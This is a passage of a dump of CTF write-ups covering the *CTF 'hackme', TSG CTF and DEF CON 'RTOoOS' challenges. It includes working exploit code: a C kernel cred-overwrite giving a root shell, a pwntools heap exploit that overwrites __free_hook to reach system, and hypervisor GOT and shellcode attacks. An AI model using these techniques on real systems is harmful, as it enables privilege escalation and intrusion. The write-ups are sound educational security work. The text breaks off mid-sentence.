= f.read()\n\tf.close()\n\treturn ret\n\nfor x in xrange(1,0xffff):\n\tsystem(\"./archimedes2 flagenc %d\" % x)\n\tkey = read_file(\"./flagenc.enc\")\n\tenc = read_file(\"./flag.enc\")\n\n\tflag = \"\"\n\tfor i in xrange(0x2f):\n\t\tflag += chr(ord(key[i]) ^ ord(enc[i]) ^ 0x8f ^ i)\n\tprint flag\n```\n\nHowever, this is slow, it might take much time to traverse all 65534 cases, but fortunately the flag comes up very soon.\n\nAlso here is the [patched program](files/archimedes2).", "timestamp": "2025-10-24T11:39:22.716161"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-04-27-Star-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-04-27-Star-CTF/README.md", "content": "## hackme\n\nThis is a kernel exploitation challenge that requires us to get root to read the flag, and I failed to solve it in contest, but let's see.\n\nAn `ioctl` is implemented in `hackme.ko`. There are 4 commands: to create memory chunk using `kmalloc`, to delete memory chunk using `kfree`, to read memory chunk using `copy_to_user` and to write the memory chunk using `copy_from_user`. When reading and writing the memory chunks, `offset` and `size` can be specified to only read or write part of the memory chunk. Here is where the vulnerability comes from: there is an integer overflow.\n\n```c\nv9 = v19.idx;\nv10 = pool[v9].buf;\nv11 = &pool[v9];\nif ( v10 && v19.off + v19.size <= v11->max_size )\n{\n  //when v19.off == -0x200L and v19.size == 0x200L\n  //we can have a underflow\n  //also works for read operation\n  copy_from_user(&v10[v19.off], v19.usrbuf, v19.size);\n  return 0LL;\n}\n```\n\n### First Attempt\n\nI initially tried to use [this method](https://ctf-wiki.github.io/ctf-wiki/pwn/linux/kernel/kernel_uaf/). In one word, `kfree` a chunk with same size as `struct cred`, and then `fork`, so that the `struct cred` of new process will be the same one as the chunk just being `kfree`ed. Then rewrite this `struct cred` by underflow. However, this does not seem work. Since the `struct cred` of new process is not the same one as the one just being `kfree`ed. I don't know the reason. Maybe it is because the kernel version since that one is `4.4.72` and this one is `4.20.13`, or it is because the `flag` argument of `kmalloc` is different.\n\n### Second Attempt\n\nThen I tried to leak the `cred` first, using `prctl(PR_SET_NAME, comm)`. The detail is [here](https://poppopret.org/2015/11/16/csaw-ctf-2015-kernel-exploitation-challenge/). This works if I read `0x100000L` bytes. Also, we can also leak the address of our memory chunks by reading `next` pointer of freed chunk. After leaking addresses, I found `cred` is very far from the memory chunks, so we cannot rewrite it directly because that will cause kernel panic. \n\nThe correct approach is to rewrite `next` pointer of the free list, a bit similar to `tcache poisoning` in `ptmalloc` exploitation. We can let `kmalloc` return an address near the `cred`, so we can rewrite `cred`. However, we don't want the free list to be corrupted since that will cause kernel panic, so we need to find a memory region whose first 8 bytes are all 0, fortunately `QWORD PTR [address of cred - 0x10] == NULL`.\n\nFinal exploit\n\n```c\n#define _GNU_SOURCE\n#include <stdlib.h>\n#include <stdio.h>\n#include <stdint.h>\n#include <unistd.h>\n#include <fcntl.h>\n#include <sys/ioctl.h>\n#include <sys/wait.h>\n#include <sys/prctl.h>\n#include <memory.h>\n#include <string.h>\n#include <assert.h>\n\nchar tab[] = {'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H',\n'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P',\n'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X',\n'Y', 'Z', 'a', 'b', 'c', 'd', 'e', 'f',\n'g', 'h', 'i', 'j', 'k', 'l', 'm', 'n',\n'o', 'p', 'q', 'r', 's', 't', 'u', 'v',\n'w', 'x', 'y', 'z', '0', '1', '2', '3',\n'4', '5', '6', '7', '8', '9', '+', '/'};\n\n\nstruct data\n{\n\tunsigned int idx;\n\tchar *usrbuf;\n\tsize_t size;\n\tsize_t off;\n};\n#define BUF_SIZE 0x100000L\nstruct data param = {0};\nchar buffer[BUF_SIZE] = {0};\nint fd;\n\nvoid init()\n{\n\tfd = open(\"/dev/hackme\",0);\n\tif (fd < 0)\n\t\texit(-1);\n\tparam.usrbuf = buffer;\n}\n\nvoid error_exit(char* msg)\n{\n\tputs(msg);\n\texit(-1);\n}\n\nvoid kmalloc(unsigned int idx, size_t size, char sig)\n{\n\tmemset(buffer, sig, sizeof(buffer));\n\tparam.size = size;\n\tparam.idx = idx;\n\tint ret = ioctl(fd, 0x30000, &param);\n\tif (ret < 0) error_exit(\"Error: kmalloc\");\n}\n\nvoid write_memory(unsigned int idx, size_t size, size_t off)\n{\n\tparam.size = size;\n\tparam.idx = idx;\n\tparam.off = off;\n\tint ret = ioctl(fd, 0x30002, &param);\n\tif (ret < 0) error_exit(\"Error: write_memory\");\n}\n\nvoid read_memory(unsigned int idx, size_t size, size_t off)\n{\n\tparam.size = size;\n\tparam.idx = idx;\n\tparam.off = off;\n\tint ret = ioctl(fd, 0x30003, &param);\n\tif (ret < 0) error_exit(\"Error: read_memory\");\n}\n\nvoid kfree(unsigned int idx)\n{\n\tparam.idx = idx;\n\tint ret = ioctl(fd, 0x30001, &param);\n\tif (ret < 0) error_exit(\"Error: read_memory\");\n}\n\nvoid printhex(char* pbuf, size_t size)\n{\n\tunsigned char* buf = (unsigned char*)pbuf;\n\tfor (size_t i = 0; i < size; ++i)\n\t{\n\t\tprintf(\"%.2x\", buf[i]);\n\t}\n\tprintf(\"\\n\");\n}\n\nchar comm[] = \"201920192019\";\n#define CHUNK_SIZE 0x40L\nint main(int argc, char const *argv[])\n{\n\tuintptr_t cred;\n\t//if (argc == 1) exit(-1);\n\tprctl(PR_SET_NAME, comm);\n\t//size_t credsize = strtoul(argv[1], 0, 16);\n\tinit();\n\n\tfor (int i = 0; i < 64; ++i)\n\t{\n\t\tkmalloc(i, CHUNK_SIZE, tab[i]);\n\t}\n\tread_memory(63, BUF_SIZE, -BUF_SIZE);\n\tchar* ret = (char*)memmem(buffer, sizeof(buffer), comm, sizeof(comm) - 1);\n\tif (ret)\n\t{\n\t\tcred = *(uintptr_t*)(ret - 8);\n\t\tassert(*(uintptr_t*)(ret - 0x10) == cred);\n\n\t\t//write(1, buffer, BUF_SIZE);\n\t\tprintf(\"%p %p\\n\", (void*)(ret - buffer), (void*)cred);\n\t\tputs(ret);\n\t}\n\n\tconst size_t LEAK_SIZE = 0x400L;\n\n\tputs(\"Before: \");\n\tkfree(62);\n\n\tkfree(61);\n\tread_memory(63, LEAK_SIZE, -LEAK_SIZE);\n\t//printhex(buffer, LEAK_SIZE);\n\n\tuintptr_t addr_62 = *(uintptr_t*)(buffer + LEAK_SIZE - CHUNK_SIZE*2);\n\tprintf(\"%p\\n\", (void*)addr_62);\n\n\t*(uintptr_t*)buffer = cred - 0x10;\n\twrite_memory(63, CHUNK_SIZE*2, -CHUNK_SIZE*2);\n\n\n\tmemset(buffer, 0, CHUNK_SIZE);\n\tkmalloc(61, CHUNK_SIZE, '\\x00'); //consume a chunk\n\t//kmalloc(62, CHUNK_SIZE, '\\x00'); //rewrite cred here\n\tuint64_t arr[8] = {0x0000000000000000,0x0000000000000000\n\t\t,0x0000000000000003,0x0000000000000000\n\t\t,0x0000000000000000,0x0000000000000000\n\t\t,0x0000000000000000,0x0000000000000000};\n\n\tparam.size = CHUNK_SIZE;\n\tparam.idx = 62;\n\tparam.usrbuf = (char*)arr;\n\tioctl(fd, 0x30000, &param);//rewrite cred, usage must NOT be changed\n\n\t// system(\"/bin/sh\");\n\t// execve will cause kernel panic, no idea why\n\t// and the exploit works for 80% probability\n\tchar* shargv[] = {\"/bin/sh\", NULL};\n\texecve(\"/bin/sh\", shargv, NULL);\n\t//in this way execve will not cause kernel panic\n\n\treturn 0;\n}\n```\n\nupload.py\n```python\n#musl-gcc -static exp.c -o ./fs/home/pwn/exp\nfrom pwn import *\nimport base64\ncontext(log_level='debug', arch='amd64')\n\nHOST = \"35.221.78.115\"\nPORT =  10022\nUSER = \"pwn\"\nPW = \"pwn\"\nBIN = \"./fs/home/pwn/exp\"\n\ndef exec_cmd(sh, cmd):\n\tsh.sendline(cmd)\n\tsh.recvuntil(\"$ \")\n\nif __name__ == \"__main__\":\n\tsh = ssh(USER, HOST, PORT, PW).run(\"/bin/sh\")\n\twith open(BIN, \"rb\") as f:\n\t\tdata = f.read()\n\tencoded = base64.b64encode(data)\n\tsh.recvuntil(\"$ \")\n\n\tonce_size = 0x200\n\tfor i in range(0, len(encoded), once_size):\n\t\texec_cmd(sh, \"echo -n \\\"%s\\\" >> benc\" % (encoded[i:i+once_size]))\n\t\tprint float(i)/len(encoded)\n\n\texec_cmd(sh, \"cat benc | base64 -d > exp\")\n\texec_cmd(sh, \"chmod +x exp\")\n\tsh.interactive()\n```\n\n\n`*CTF{userf4ult_fd_m4kes_d0uble_f3tch_perfect}`\n", "timestamp": "2025-10-24T11:39:23.529962"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-05-04-TSG-CTF/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-05-04-TSG-CTF/README.md", "content": "## EsoVM\n\n[esovm](esovm.pdf)\n\n## Super Smash Bros\n\nIn this challenge a simple file system is implemented, here is the data structures\n\n```assembly\n00000000 file            struc ; (sizeof=0x80, mappedto_6)\n00000000 type            db ?\n00000001 dir_name        db 38 dup(?)\n00000027 data            fdata ?\n00000080 file            ends\n\n00000000 fdata           union ; (sizeof=0x59, mappedto_8)\n00000000 dir_files       db 89 dup(?)\n00000000 file_data       filedata ?\n00000000 fdata           ends\n\n00000000 filedata        struc ; (sizeof=0x59, mappedto_9)\n00000000 isbig           db ?\n00000001 pbuf            dq ?\n00000009 buf             db 80 dup(?)\n00000059 filedata        ends\n\n00000000 fs              struc ; (sizeof=0x8000, mappedto_7)\n00000000 files           file 256 dup(?)\n00008000 fs              ends\n```\n\nHere is a overflow when `add_file` is called\n\n```c\n__isoc99_scanf(\"%90s\", v4->data.file_data.buf);// overflow\n```\n\nHowever, what we can change is the `type` field only, so we can cause the type confusion.\n\nHere is the exploit, I think my idea is explained well in the comments :D\n\n```python\nfrom pwn import *\n\ng_local=1\ncontext(log_level='debug', arch='amd64')\ne = ELF(\"/lib/x86_64-linux-gnu/libc-2.27.so\")\nif g_local:\n\tsh = process(\"./ssb\")\n\tgdb.attach(sh)\nelse:\n\tsh = remote(\"34.85.75.40\", 31000)\n\nsh.recvuntil(\"> \")\n\ndef add_file(name, size, data):\n\tsh.sendline(\"2\")\n\tsh.recvuntil(\"name: \")\n\tsh.sendline(name)\n\tsh.recvuntil(\"size: \")\n\tsh.sendline(str(size))\n\tsh.send(data)\n\tsh.recvuntil(\"> \")\n\n\ndef input_name(cmd, name):\n\tsh.sendline(cmd)\n\tsh.recvuntil(\"name: \")\n\tsh.sendline(name)\n\tsh.recvuntil(\"> \")\n\nadd_dir = lambda name : input_name('3', name)\nremove = lambda name : input_name('6', name)\nchange_dir = lambda name : input_name('5', name)\n\ndef show_file(name):\n\tsh.sendline('4')\n\tsh.recvuntil(\"name: \")\n\tsh.sendline(name)\n\tret = sh.recvuntil('\\n')\n\tsh.recvuntil(\"> \")\n\treturn ret[:-1]\n\n# 0. create 1+8 big files, 1 small file, 1 big file\n#\tlast big file should have pdata address LSB==0\n\n# make LSB of new chunk == 0x00\nadd_file('prepad', 0x80, 'prepad')\n\n# fill tcache\nfor i in xrange(8):\n\tadd_file(str(i), 0x80, str(i))\nfor i in xrange(7):\n\tremove(str(i))\n\nadd_file(\"tmp\", 0x10, \"tmp\\n\")\nadd_file('8', 0x60, '8') # will rewrite its address\n\n# 1. big file -> directory\nremove(\"tmp\")\nadd_file(\"overflow\", 0x10, \"A\" * 0x50 + '\\x01' + 'hacked\\n')\n\n# 1.1. fill index 0x90\nadd_dir(\"d1\")\nchange_dir(\"d1\")\nfor i in xrange(0x59):\n\tadd_file(\"pad\", 0x10, \"pad\\n\")\nchange_dir(\"..\")\n#0x5a\n\nadd_dir(\"d2\")\nchange_dir(\"d2\")\nfor i in xrange(0x90 - 4 - 0x5a - 2):\n\tadd_file(\"pad\", 0x10, \"pad\\n\")\nadd_file(\"0x90\", 0x10, \"0x90\\n\")\nchange_dir(\"..\")\n\n# 2. cd into that directory\n# 3. remove dir_files[1],\n#\tso LSB of address is cleared to 0,\n#\twhich is another big file data\nchange_dir(\"hacked\")\nremove(\"0x90\")\nchange_dir(\"..\")\n\n# 4. change it back to big file\nremove(\"overflow\")\nadd_file(\"overflow\", 0x10, \"A\" * 0x50 + '\\x02' + 'hacked\\n')\n\n# 5. free, cause UAF, then leak\nremove(\"hacked\")\nlibc_addr = u64(show_file(\"7\") + '\\x00\\x00') - 0x3ebca0\nprint hex(libc_addr)\n\n# 6. double free, poison 0x90 tcache\nfor i in xrange(7): # consume tcache\n\tadd_file(str(i), 0x80, str(i))\nadd_file('8', 0x80, '8') #consume unsorted bin\nremove('7')\nremove('8') # double free\n\n# 7. rewrite free hook\nadd_file(\"rewrite_fd\", 0x80, \\\n\tp64(libc_addr + e.symbols[\"__free_hook\"]))\nadd_file(\"consume\", 0x80, p64(0))\nadd_file(\"rewrite_free_hook\", 0x80, \\\n\tp64(libc_addr + e.symbols[\"system\"]))\n\n# 8. get shell\nadd_file(\"shell\", 0x80, \"/bin/sh\")\n\nsh.sendline('6')\nsh.recvuntil(\"name: \")\nsh.sendline(\"shell\")\nsh.interactive()\n```\n\n", "timestamp": "2025-10-24T11:39:24.179265"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-05-04-TSG-CTF/out.txt", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-05-04-TSG-CTF/out.txt", "content": "[0x2] = [0x3]\n\nouter_loop:\n[0x0] = [0x4]\n[0x0] = getchar()\n[0x4] = [0x0] // [0x4] == inputc\n[0x5] = [0x3]\n\ninner_loop:\n[0x0] = [0x2]\n[0x1] = [0x2b] //8\n[0x0] += [0x1]\n\n[0x2a] = [0x0] //[2]+8\n[[0x7]] = [[0x2a]] //[0x6] = [[2]+8]\n[0x0] = [0x4]\n[0x1] = [0x6]\n[0x0] *= [0x1] // inputc *= [[2]+8]\n[0x4] = [0x0]\n\n[0x0] = [0x2]\n[0x1] = [0x4e]\n[0x0] += [0x1] //+= 0x2c\n[0x2a] = [0x0]\n[[0x7]] = [[0x2a]] // [0x6] = [[2]+0x2c]\n[0x0] = [0x4]\n[0x1] = [0x6]\n[0x0] += [0x1] //inputc += [[2]+0x2c]\n[0x4] = [0x0]\n\n[0x0] = [0x5]\n[0x1] = [0x71]\n[0x0] += [0x1]\n[0x2a] = [0x0]\n[[0x7]] = [[0x2a]] // [0x6] = [[5]+0x4f]\n[0x0] = [0x6]\n[0x1] = [0x4]\n[0x0] += [0x1] // [6] = inputc + [[5]+0x4f]\n[0x6] = [0x0]\n\n[0x0] = [0x5]\n[0x1] = [0x71]\n[0x0] += [0x1]\n[0x2a] = [0x0]\n[[0x2a]] = [[0x7]] // [[5]+0x4f] = [0x6]\n[0x0] = [0x5]\n[0x1] = [0x72]\n[0x0] += [0x1]\n[0x5] = [0x0] // [5]++\n[0x6] = [0x5]\n\n[0x0] = [0x6]\n[0x1] = [0x73]\n[0x0] = [0x0]==[0x1] // [5] == 0x22\n[0x6] = [0x0]\n[0x0] = [0x6]\n[0x1] = [0x3]\n[0x0] = [0x0]==[0x1] // !([5] == 0x22)\n[0x6] = [0x0]\n[0x0] = [0x6]\n0 47\n\n[0x0] = [0x2]\n[0x1] = [0x72]\n[0x0] += [0x1]\n[0x2] = [0x0]\n[0x6] = [0x2]\n[0x0] = [0x6]\n[0x1] = [0x73]\n[0x0] = [0x0]==[0x1]\n[0x6] = [0x0]\n[0x0] = [0x6]\n[0x1] = [0x3]\n[0x0] = [0x0]==[0x1]\n[0x6] = [0x0]\n[0x0] = [0x6]\n0 66\n\n\n[0x74] = [0x3]\n[0x2] = [0x3]\nloop2:\n[0x0] = [0x2]\n[0x1] = [0x71]\n[0x0] += [0x1]\n[0x2a] = [0x0]\n[[0x7]] = [[0x2a]] //[6] = [[2] + 0x4f]\n[0x0] = [0x2]\n[0x1] = [0x98]\n[0x0] += [0x1]\n[0x2a] = [0x0]\n[[0x75]] = [[0x2a]] // [0x4] = [[2]+0x76]\n[0x0] = [0x6]\n[0x1] = [0x4]\n[0x0] = [0x0]==[0x1]\n[0x6] = [0x0]\n[0x0] = [0x6]\n[0x1] = [0x3]\n[0x0] = [0x0]==[0x1]\n[0x6] = [0x0]\n[0x0] = [0x74]\n[0x1] = [0x6]\n[0x0] += [0x1]\n[0x74] = [0x0]\n[0x0] = [0x2]\n[0x1] = [0x72]\n[0x0] += [0x1]\n[0x2] = [0x0]\n[0x6] = [0x2]\n[0x0] = [0x6]\n[0x1] = [0x73]\n[0x0] = [0x0]==[0x1]\n[0x6] = [0x0]\n[0x0] = [0x6]\n[0x1] = [0x3]\n[0x0] = [0x0]==[0x1]\n[0x6] = [0x0]\n[0x0] = [0x6]\n0 37\n\n\n[0x0] = [0x74]\n1 20\n[0x0] = [0x99]\nputchar([0x0])\n[0x0] = [0x9a]\nputchar([0x0])\n[0x0] = [0x9b]\nputchar([0x0])\n[0x0] = [0x9b]\nputchar([0x0])\n[0x0] = [0x9c]\nputchar([0x0])\n[0x0] = [0x9d]\nputchar([0x0])\n[0x0] = [0x9e]\nputchar([0x0])\n[0x0] = [0x9f]\nputchar([0x0])\n[0x0] = [0xa0]\nputchar([0x0])\n[0x0] = [0x72]\n1 22\n[0x0] = [0xa1]\nputchar([0x0])\n[0x0] = [0x9b]\nputchar([0x0])\n[0x0] = [0x9a]\nputchar([0x0])\n[0x0] = [0xa2]\nputchar([0x0])\n[0x0] = [0xa3]\nputchar([0x0])\n[0x0] = [0xa4]\nputchar([0x0])\n[0x0] = [0x9d]\nputchar([0x0])\n[0x0] = [0x9b]\nputchar([0x0])\n[0x0] = [0xa5]\nputchar([0x0])\n[0x0] = [0xa4]\nputchar([0x0])\n[0x0] = [0xa0]\nputchar([0x0])\n[0x0] = [0x72]\n0 2", "timestamp": "2025-10-24T11:39:24.362306"}
{"source": "github", "repo": "Aurel300/empirectf", "file": "writeups/2019-05-11-DEF-CON-CTF-Qualifier/README.md", "url": "https://github.com/EmpireCTF/empirectf/blob/master/writeups/2019-05-11-DEF-CON-CTF-Qualifier/README.md", "content": "## 143 Pwn / RTOoOS\n\n### Overview\n\nIn this challenge, a raw binary file that implements a command line using `amd64` assembly is given, but the hypervisor that is running this binary on remote server is not given. We can read files in remote server except `honcho` (the hypervisor) and `flag`, which are banned by kernel and hypervisor respectively. We need to find the vulnerability in the kernel to leak hypervisor first, then find the vulnerability in hypervisor to read the flag.\n\n### Reverse Engineering Kernel\n\nThe kernel implements a simple command shell\n\n```c\n//main function\nvoid __fastcall __noreturn sub_13F0(__int64 a1, __int64 a2, __int64 a3, __int64 a4)\n{\n  unsigned __int16 v4; // dx\n  unsigned __int16 v5; // dx\n  unsigned __int16 v6; // dx\n  int v7; // ST1C_4\n  char a1a[520]; // [rsp+20h] [rbp-230h]\n  __int64 v9; // [rsp+228h] [rbp-28h]\n  __int64 v10; // [rsp+230h] [rbp-20h]\n  __int64 v11; // [rsp+238h] [rbp-18h]\n  __int64 v12; // [rsp+240h] [rbp-10h]\n\n  v12 = a1;\n  v11 = a2;\n  v10 = a3;\n  v9 = a4;\n  init_heap(&unk_3650, 0x1000LL);\n  print(\"CS420 - Homework 1\", 0x1000LL, v4);\n  print(\"Student: Kurt Mandl\", 0x1000LL, v5);\n  print(\"Submission Stardate 37357.84908798814\", 0x1000LL, v6);\n  while ( 1 )\n  {\n    memset(a1a, 0, 512u);\n    print_cmd_arr();\n    v7 = get_input(a1a, 511LL, 0x1FFu);\n    execute_cmd((unsigned __int8 *)a1a, v7);\n  }\n}\n```\n\nWe I am looking at the `print` and `get_input` functions, it seems that they all use `out`, which is a bit weird to use `out` to get user input. But then I realize it is a binary run in hypervisor, so the hypervisor can execute anything including `read` even if an `out` instruction is used.\n\nWhen executing `cat`, it seems the `honcho` is blocked here\n\n```c\nv6 = strlen(\"cat \");\nif ( !memcmp(\"cat \", cmd, v6) )\n{\n  if ( (signed int)strlen((char *)cmd) <= 4 )\n  {\n    v40 = 0;\n    print(\"no file to cat\", (__int64)cmd, v7);\n    return v40;\n  }\n  if ( substr((char *)cmd + 4, \"honcho\") )\n    print(\"reading hypervisor blocked by kernel!!\", (__int64)\"honcho\", v8);\n  else\n    cat((__int64)(cmd + 4), (__int64)\"honcho\", v8);\n}\n```\n\nA interesting function is environment variable, in which variables are stored using key-value pair. The structure is something like this:\n\n```c\nchar keys[16][512]; //at 0x1650, 512*16 = 0x2000\n//something in the middle(0x3650), covered later\nchar* values[16]; //at 0x4650\n//A key-value pair will have same index value\n```\n\nWhen `export` is executed, it will change the `value` in current variable if `stored key == input key`, and also add a new key-value pair if there is free index. This is a bit weird, because it will create 2 variables with same key and value if same key is exported twice.\n\n```c\nif ( !memcmp(\"export \", cmd, v9) )\n{\n  export_key = (char *)&cmd[(signed int)strlen(\"export \")];\n  export_val = 0LL;\n  for ( i = 0; i < (signed int)strlen(export_key); ++i )\n  {\n    if ( export_key[i] == '=' )\n    {\n      export_val = &export_key[i + 1];\n      export_key[i] = 0;\n      break;\n    }\n  }\n  for ( j = 0; j < 16; ++j )\n  {\n    v32 = 0;\n    if ( (unsigned int)strlen((char *)(((signed __int64)j << 9) + 0x1650))\n      && !strcmp((unsigned __int8 *)(((signed __int64)j << 9) + 0x1650), (unsigned __int8 *)export_key) )\n    {                                   // there is currently the same key\n      v10 = len - (unsigned __int64)strlen(export_key);\n      len = v10 - (unsigned __int64)strlen(\"export\");\n      for ( k = 0; k < len; values[j][v32++] = export_val[k++] )\n      {\n        if ( export_val[k] == '$' )\n        {\n          for ( l = 0; l < 16; ++l )\n          {\n            v11 = strlen((char *)(((signed __int64)l << 9) + 0x1650));\n            if ( !memcmp(\n                    (unsigned __int8 *)&export_val[k + 1],\n                    (unsigned __int8 *)(((signed __int64)l << 9) + 0x1650),\n                    v11) )\n            {\n              for ( m = 0; m < (signed int)strlen(values[l]); ++m )\n              {\n                v12 = v32++;\n                values[j][v12] = values[l][m];\n              }\n              k += strlen(values[l]);   // value? should it be key?\n              break;\n            }                           // might be vulnerable here\n          }\n        }\n      }\n    }\n  }\n  v28 = 0;\n  for ( n = 0; n < 16; ++n )\n  {\n    if ( !(unsigned int)strlen((char *)(((signed __int64)n << 9) + 0x1650)) )\n    {\n      v13 = strlen(export_key);\n      memcpy((char *)(((signed __int64)n << 9) + 0x1650), export_key, v13);\n      v14 = 512 - (unsigned __int64)strlen(export_key);\n      v15 = strlen(\"export \");\n      values[n] = (char *)malloc(v14 - v15 + 1);// no 0 checking\n      v16 = 512 - (unsigned __int64)strlen(export_key);\n      lena = v16 - (unsigned __int64)strlen(\"export \");\n      for ( ii = 0; ii < lena; values[n][v28++] = export_val[ii++] )\n      {\n        if ( export_val[ii] == '$' )\n        {\n          for ( jj = 0; jj < 16; ++jj )\n          {\n            v17 = strlen((char *)(((signed __int64)jj << 9) + 0x1650));\n            if ( !memcmp(\n                    (unsigned __int8 *)&export_val[ii + 1],\n                    (unsigned __int8 *)(((signed __int64)jj << 9) + 0x1650),\n                    v17) )\n            {\n              for ( kk = 0; kk < (signed int)strlen(values[jj]); ++kk )\n              {\n                v18 = v28++;\n                values[n][v18] = values[jj][kk];// certainly overflow\n              }\n              ii += strlen(values[jj]);\n              break;\n            }\n          }\n        }\n      }\n      return 0;\n    }\n  }\n}\n```\n\nIt will also expands environment variable if `'$'` is found in the input value. This is where the vulnerability comes from. After the expansion, the string can be longer than the original input, thus causing heap overflow. Actually there are other vulnerabilities: for example, there is no `null` check when `malloc` is called, but I found them harder to exploit than that heap overflow.\n\nHowever, we also need to know how heap is implemented here. It is just a simple single linked list heap implementation.\n\n```c\nstruct chunk\n{\n  unsigned __int64 avai_size;\n  int isfree;\n  chunk *next;\n};\nvoid __fastcall init_heap(_QWORD *a1, __int64 a2)\n{//init_heap(&unk_3650, 0x1000LL);\n  heap = a1;\n  list = (chunk *)a1;\n  list->avai_size = a2 - 0x18;\n  list->isfree = 1;\n  list->next = 0LL;\n  size = a2;\n}\nsigned __int64 __fastcall malloc(unsigned __int64 a1)\n{\n  bool v2; // [rsp+7h] [rbp-29h]\n  chunk *a1a; // [rsp+18h] [rbp-18h]\n  signed __int64 v4; // [rsp+28h] [rbp-8h]\n\n  if ( !list->avai_size )\n    BUG();\n  for ( a1a = list; ; a1a = a1a->next )\n  {//traverse the list to find an available one\n    if ( a1a->avai_size < a1 || (v2 = 0, !a1a->isfree) )\n      v2 = a1a->next != 0LL;\n    if ( !v2 )\n      break;\n  }\n  if ( a1a->avai_size == a1 )\n  {// if size excactly match\n    a1a->isfree = 0;\n    v4 = (signed __int64)&a1a[1];\n  }\n  else if ( a1a->avai_size <= a1 + 24 )         // problematic, but hard to exploit\n  {// if size is not enough\n    v4 = 0LL;                                   // no heap space, return 0\n  }\n  else\n  {// if size needed is smaller than the free chunk we have\n    sub_100(a1a, a1);\n    v4 = (signed __int64)&a1a[1];\n  }\n  return v4;\n}\nvoid __fastcall sub_100(chunk *a1, __int64 a2)\n{//split the chunk\n  chunk *v2; // ST00_8\n  v2 = (chunk *)((char *)a1 + a2 + 0x18);\n  v2->avai_size = a1->avai_size - a2 - 0x18;\n  v2->isfree = 1;\n  v2->next = a1->next;\n  a1->avai_size = a2;\n  a1->isfree = 0;\n  a1->next = v2;\n}\n```\n\nThe key is that after the heap, there is `char* values[16]` array, so as long as we can allocate chunk that is just before the `values`, we can use heap overflow to rewrite it.\n\n### Exploit Kernel\n\nTo rewrite `values` array, what I did is to allocate chunk with size `0x200` for 6 times, then allocate chunk with size `0x200` with value long enough followed by new pointer in the end that will rewrite `values[0]`, then allocate chunk with size `0x200` to cause overflow.\n\n```python\ndef allocate_pre(sh):\n\tsh.recvuntil(ARR)\n\tfor i in xrange(6):\n\t\texport(sh, str(i) * l, str(i))\n\ndef leak_honcho(sh):\n\thoncho = 0x1508\n\texport(sh, str(7) * l, 'A' * (l+1+3) + p16(honcho))\n\texport(sh, '8' * l, (val_len(l) - (l+1) - 2) * '8' + '$' + '7' * l)\n\texport(sh, '0' * l, \"leak\") # rewrite \"honcho\" global string\n\tdata = cat(\"honcho\")\n\n\tf = open(\"honcho\", \"wb\")\n\tf.write(data)\n\tf.close()\n```\n\n### Reverse Engineering Hypervisor\n\nAfter dumping the hypervisor, we found that this is a MacOS executable, which I am not familiar with. This is the first time for me to exploit a MacOS program, and I don't have a MacOS machine either, but fortunately there are MacOS machines in our lab.\n\nThe symbols are not stripped which is great, there are many hypervisor stuff which you actually don't need to get into, because the handler of `out` from that simple OS is an obvious switch statement.\n\nThe vulnerability is here, out-of-bound access.\n\n```c\ncase 'c':\n  v8 = read(0, (char *)vm_mem + v22, v19);\n  hv_vcpu_write_register((unsigned int)vcpu, 2LL, v8);\n  break;\ncase 'd':\n  puts((const char *)vm_mem + v22);\n  break;\n```\n\nAlso, I have patched out function `drop_privs`, which is not useful and with this function we need `root` privilege to run the binary, which I don't have in our lab machine.\n\n### Exploit Hypervisor\n\nAfter some debugger, I found that even if the PIE is enabled, the offset from `vm_mem` to program base is constant. This is great: we can use OOB to leak and rewrite `got` table in the binary and hijack control flow. What I am thinking about is to rewrite `strcasestr` to something that will return `0`, which enables us to read the flag.\n\n```c\ncase 'f':\n  v12 = v3;\n  v13 = (char *)vm_mem + v22;\n  if ( strcasestr((const char *)vm_mem + v22, \"flag\") )\n  {\n    printf(\"hypervisor blocked read of %s\\n\", v13);\n  }\n  else\n  {\n    v14 = ReadFile(0LL, v13, (__int64 *)&v21);\n    write(1, v14, v21);\n  }\n```\n\nInitially I was thinking about `malloc`, which should returns `null` when the size(`vm_mem + v22`) is too big, but this does not seem work and I am not sure why; then I found `atoi` works fine because `atoi(\"flag\")` returns 0.\n\nHowever, even if in the same machine the offset from `vm_mem` to program base is constant, in the remote machine that offset is different from the local one. I realized this when I run this program on different MacOS machines (thanks @[PK398](https://github.com/PK398) for providing his MacOS machine that helps my analysis :D). So, I tried to brute force to find the correct offset.The method to execute shellcode is same as the technique used to modify `\"honcho\"` global string, but this time we change the codes in handler of `export` command (this is chosen because codes here are long, so less likely to rewrite something that should not be modified). \n\n```python\ndef rce(sh,shellcode):\n\texport_handler = 0xC43\n\texport(sh, str(7) * l, 'A' * (l+1+3) + p16(export_handler))\n\texport(sh, '8' * l, (val_len(l) - (l+1) - 2) * '8' + '$' + '7' * l)\n\tno_zero(shellcode)\n\texport(sh, '0' * l, shellcode)\n\tsh.send(\"export \")\ndef leak_prog(off):\n\tsh = remote(\"rtooos.quals2019.oooverflow.io\", 5000)\n\timg_addr = (-(0x7966a)+off) & 0xffffffffffffffff\n\n\tallocate_pre(sh)\n\n\tputs = 0x76\n\tread = 0x69\n\t#asm(\"this: jmp this\")\n\tshellcode = '''\n\tmov rdi,%s;\n\tpush 0x41;\n\tpop rsi;\n\tsub rdi,rsi;\n\txor rax,rax;\n\tmov al,0x76;\n\tcall rax;\n\tthis:\n\tjmp this;\n\t''' % (hex(img_addr + 0x41))\n\tpayload = asm(shellcode)\n\trce(sh, payload)\n\ttry:\n\t\tret = sh.recvuntil(\"\\n\")\n\t\tif len(ret) > 1:\n\t\t\tprint_hex(ret)\n\t\t\tsh.interactive()\n\t\tif ret[:3] == \"\\x48\\x89\\xC3\":\n\t\t\tret = True\n\t\telse:\n\t\t\tret = False\n\t\tsh.close()\n\texcept Exception as e:\n\t\tret = False\n\t\tsh.close()\n\t\treturn ret\n\nfor i in xrange(-0x30, 0x30):\n\tprint \"testing \" + hex(i)\n\tif leak_prog(i * 0x1000):\n\t\tprint hex(i * 0x1000)\n\t\tinput()\n```\n\nEven if the offset is different, they don't seem to differ a lot according to my testing on different machines. So, I will test over 